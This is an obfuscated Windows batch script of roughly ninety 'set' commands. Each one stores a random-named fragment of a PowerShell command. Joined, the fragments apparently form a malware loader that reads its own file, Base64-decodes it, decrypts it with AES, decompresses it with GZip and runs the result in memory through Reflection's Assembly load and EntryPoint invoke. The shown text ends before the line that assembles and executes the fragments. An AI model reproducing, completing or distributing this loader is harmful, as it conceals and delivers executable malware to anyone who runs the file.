@echo off
set "kDwgLQUiYk=ddin"
set "raolffkafa= = $"
set "RoGjGNRJWk=[Env"
set "EDfIxMIdEI=S46e"
set "tyOrDhZghS=Pk.T"
set "CRMecVwYtI=grap"
set "EqQxTfNvie=rity"
set "pVzBFCKLpB=$rcs"
set "ccNGWLxrZN=rf ="
set "BEohoKcYcf=y.Pa"
set "qNQKAyFyjT=oint"
set "qvViOZSYtS= if "
set "sRYHlJKXLa=;$FG"
set "jFOSSSjVpd=esMa"
set "XbnlebRVDZ=tryP"
set "fnzOgyzRrq=fCbI"
set "PdoQgHURPQ=pStr"
set "gvdziWoFlS=::De"
set "ilatUqoyet=comm"
set "vHZWNGYiLj=-joi"
set "CkBoivYyhg=).Sp"
set "zlvFsJODTy=raph"
set "MSwOgRqCLZ=ct S"
set "POlrtgviFx=Fob "
set "yydDBGWWil=.Dis"
set "DZtUmdGLgs=ring"
set "gdWgnSpmMi=pose"
set "vGHtPqzLGD= '')"
set "eBCjBwSxsQ=m.Re"
set "MQhJUojeRp='txe"
set "xMnhyUFQir= [st"
set "idwbUQRWdY=yste"
set "YzLdoNGujl== $v"
set "yOaEfSrxRe=$buL"
set "ESfEpgncRH=Syst"
set "tjLZfLJdwq=ionM"
set "xqECFGOIQM=ateD"
set "dVZIeNAzpL=ypto"
set "XYsYCnEsHu=]::N"
set "qlsJQzzjkq=bstr"
set "LQbvvrHazr=, $b"
set "onmcYwRTiw= = ["
set "baZFFndEEK=Disp"
set "WygKJHEQtY=fsQz"
set "AzHkxWFQiZ='h6b"
set "bucyLWnIxt=Disp"
set "gWGtjbBbMu=-4] "
set "RYuflHfYTY=n ''"
set "JCRnilCBGy=embl"
set "JhehEPFIHw=rt]:"
set "LaHlPlIXZv=th('"
set "fekkSNtEbY=16] "
set "pfHkriYaiV=Yv.D"
set "wkWnOoYGnI=();$"
set "FGkZsOatcn=$buL"
set "jzdveEWZSd= = $"
set "PIsCLLJYGB=);$v"
set "iAcwXVYBqo=1] -"
set "POSZlLrBuv= New"
set "FQWafmkOJD=rf.T"
set "XwbNiDUTZk=3); "
set "bvKsgjeixK=Pl ="
set "iGPHgPcJai=)) {"
set "JtLkCknbkU=;$yD"
set "jgHYnlRvVM=TzrP"
set "XEaFMuPNfX=onve"
set "ajcphZDUVD=v = "
set "kTNQOsHwTU=pose"
set "iYXRUsAcPD=YFUU"
set "BQkUWtFmBy=znSk"
set "NHQqrsnfBx=Etk/"
set "sNyhloUwSi=yste"
set "ADqjBlzsAo=le  "
set "mynsZAKvmq=($YF"
set "KRPxjmOrOr=ew-O"
set "wEPIQFNqqB=y.Ci"
set "oXUJTKtEdI=, (,"
set "dUWMtxXnjv=fCbI"
set "EoCWErUFzD=ewLi"
set "sAhXMrRezS=lit("
set "QySfuWBRbQ=g = "
set "OTjXFmedVc=n ''"
set "AUrIDnMJNW=);$D"
set "wuOMsgBHri=$Tzr"
set "yLxpUcjJpd='gni"
set "KXruiLImpa=.Com"
set "ZQvpVCKTEY=form"
set "WIKAlntwUq=6] -"
set "LdSnrGmKFA=oL'["
set "BcxpLPSZAA=.GZi"
set "TrSyGHWtle=k; }"
set "nRiKQitDDe=mory"
set "jYtxAcRsyO=hy.A"
set "qXWByPfPxw=)($z"
set "HItdXCcHoy=;$nE"
set "IlKHtPcRQu=('%~f0'"
set "HbuOdyrhpY=m.IO"
set "ItkgWzXFRw=157K"
set "DaUFVqCWgJ=morF"
set "dAaivYPAWp=csrf"
set "NTiwqrpEiI=$nEl"
set "aXUDPXflQi=);$Q"
set "UEPZtHmllE=1..-"
set "LNdjDOxyep=)($b"
set "ZmUCftAain=New-"
set "nWBVvvgaAa=flec"
